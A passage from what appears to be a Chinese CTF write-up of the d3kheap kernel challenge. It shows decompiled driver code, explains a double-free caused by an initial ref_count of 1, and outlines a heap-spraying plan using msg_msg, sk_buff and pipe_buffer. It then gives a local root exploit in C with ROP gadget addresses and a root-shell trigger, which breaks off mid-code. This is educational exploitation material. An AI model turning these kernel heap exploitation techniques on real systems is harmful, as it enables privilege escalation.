LABEL_13;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1234</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(<span class="string">&quot;\x011[d3kheap:] You already had a buffer!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">3264LL</span>, <span class="number">1024LL</span>);</span><br><span class="line">        ++ref_count;</span><br><span class="line">        buf = v3;</span><br><span class="line">        printk(&amp;unk_37A);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)a2 &gt; <span class="number">0x1233</span> &amp;&amp; ((_DWORD)a2 == <span class="number">0x4321</span> || (_DWORD)a2 == <span class="number">0xBEEF</span>) )</span><br><span class="line">      printk(&amp;unk_3F0);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">      printk(&amp;unk_4F8);</span><br><span class="line">LABEL_5:</span><br><span class="line">    pv_ops[<span class="number">79</span>](&amp;spin);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_4A8);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ref_count )</span><br><span class="line">  &#123;</span><br><span class="line">    --ref_count;</span><br><span class="line">    kfree();</span><br><span class="line">    printk(&amp;unk_394);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))d3kheap_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞就出在ref_count被初始化为1</p><p>导致存在一个double free,因为slub也有double free的检查(要释放的指针是否等于slub上的第一个指针),所以需要转化为UAF利用</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>可以说是一道十分经典的考察内核堆喷这一手法的题目了</p><p>将两次free得出的obj分别称作A与B,思路如下</p><ol><li>堆喷msg队列,每个消息队列上有两个消息,分别是96与1024(总大小),使一个1024的obj获得A</li><li>堆喷sk_buff,使其获得B,并修改A,使其m_ts与其他obj不同</li><li>遍历读取msg,因为前一步修改了A的size,所以读取A时会返回负数,依此判定victim</li><li>释放所有的sk_buff,重新堆喷sk_buff,使得再次读取msg时可以越界读取到下一个obj的header</li><li>释放所有的sk_buff,重新堆喷sk_buff,利用上一步中的header中的prev指针来读取victim的下一个obj的地址,并通过减去0x400,得到victim的地址</li><li>释放所有的sk_buff,重新堆喷sk_buff,恢复victim,然后将其释放</li><li>堆喷pipe_buffer,此时pipe_buffer与sk_buff重叠</li><li>释放所有的sk_buff,并在过程中判断重叠的那个obj,读取其中的数据,泄露内核代码基址</li><li>布置rop流与伪造的pipe_buffer,重新堆喷sk_buff,写入到victim中,并关闭所有的管道触发</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW    0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 